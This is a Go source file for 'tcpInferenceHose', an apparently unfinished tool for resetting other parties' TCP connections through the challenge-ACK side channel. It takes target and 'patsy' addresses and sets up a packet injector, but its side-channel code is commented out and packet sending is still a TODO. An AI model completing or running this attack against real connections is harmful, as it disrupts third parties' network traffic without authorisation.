/*
 *    TCP inference "hose" - for hosing TCP connections with:
 *    RST injection using the challenge ACK inference side-channel
 *
 *    Copyright (C) 2016  David Anthony Stainton
 *
 *    This program is free software: you can redistribute it and/or modify
 *    it under the terms of the GNU General Public License as published by
 *    the Free Software Foundation, either version 3 of the License, or
 *    (at your option) any later version.
 *
 *    This program is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *    GNU General Public License for more details.
 *
 *    You should have received a copy of the GNU General Public License
 *    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package main

import (
	"flag"
	"net"
	"os"
	"os/signal"
	"syscall"
	"unsafe"

	"github.com/david415/HoneyBadger/attack"
	"github.com/op/go-logging"
)

var log = logging.MustGetLogger("tcpInferenceHose")

var logFormat = logging.MustStringFormatter(
	"%{level:.4s} %{id:03x} %{message}",
)
var ttyFormat = logging.MustStringFormatter(
	"%{color}%{time:15:04:05} ▶ %{level:.4s} %{id:03x}%{color:reset} %{message}",
)

const ioctlReadTermios = 0x5401

func isTerminal(fd int) bool {
	var termios syscall.Termios
	_, _, err := syscall.Syscall6(syscall.SYS_IOCTL, uintptr(fd), ioctlReadTermios, uintptr(unsafe.Pointer(&termios)), 0, 0, 0)
	return err == 0
}

func setupLoggerBackend() logging.LeveledBackend {
	format := logFormat
	if isTerminal(int(os.Stderr.Fd())) {
		format = ttyFormat
	}
	backend := logging.NewLogBackend(os.Stderr, "", 0)
	formatter := logging.NewBackendFormatter(backend, format)
	leveler := logging.AddModuleLevel(formatter)
	leveler.SetLevel(logging.INFO, "tcpInferenceHose")
	return leveler
}

func main() {
	var (
		nfqNum = flag.Int("nfq_num", -1, "NFQUEUE queue-number to get packets from")
		//iface       = flag.String("interface", "lo", "Interface to get packets from")
		//filter      = flag.String("pcap_filter", "tcp", "BPF filter for pcap")
		//snaplen     = flag.Int("pcap_max_size", 65536, "SnapLen for pcap packet capture")
		targetIPstr = flag.String("target_ip", "", "target TCP flows to this IPv4 or IPv6 address")
		targetPort  = flag.Int("target_port", -1, "target TCP flows to this port")
		patsyIPstr  = flag.String("patsy_ip", "", "patsy TCP flows from this port")
	)

	logBackend := setupLoggerBackend()
	log.SetBackend(logBackend)

	flag.Parse()
	if len(*patsyIPstr) == 0 {
		log.Error("you must specify a 'patsy' IP address")
		flag.Usage()
		os.Exit(-1)
	}
	patsyIP := net.ParseIP(*patsyIPstr)
	if patsyIP.To4() == nil {
		log.Info("Patsy IP address is an IPv6 address; using ipv6 mode")
	} else {
		log.Info("using ipv4 mode")
	}

	if *targetIPstr == "" {
		log.Error("you must specify a 'target' IP address")
		flag.Usage()
		os.Exit(-1)
	}
	targetIP := net.ParseIP(*targetIPstr)

	if *targetPort == -1 {
		log.Error("you must specify a 'target' TCP port")
		flag.Usage()
		os.Exit(-1)
	}
	if *nfqNum == -1 {
		log.Info("setup your iptables like this: iptables -A OUTPUT -p tcp -j NFQUEUE --queue-num 1 --queue-bypass")
		log.Error("you must specify an NFQUEUE queue-number corresponding to an IPTABLES NFQUEUE rule")
		flag.Usage()
		os.Exit(-1)
	}

	sigKillChan := make(chan os.Signal, 1)
	signal.Notify(sigKillChan, os.Interrupt, os.Kill)

	/*
		sideChannel := attack.NewTCPInferenceSideChannel(uint16(*nfqNum))
		err := sideChannel.Open()
		if err != nil {
			log.Warning(fmt.Sprintf("NFQueue's Open returned error: %s", err))
			//panic(fmt.Sprintf("failed to initialize NFQUEUE socket: %s", err))
		}
		log.Info("before flutter")
		go sideChannel.Flutter()
	*/

	// XXX todo == send a packet!

	injector := attack.NewTCPStreamInjector(targetIP)
	log.Notice("before setting hw addr")
	err := injector.SetEthernetToHWAddr()
	if err != nil {
		panic(err)
	}
	log.Notice("after setting hw addr")

	// the end is near, here we wait
	// XXX TODO wait for additonal events
	log.Notice("waiting for quit events")
	for {
		select {
		case <-sigKillChan:
			log.Notice("tcpInferenceHose shutting down")
			//sideChannel.Close()
			return
		}
	}
}
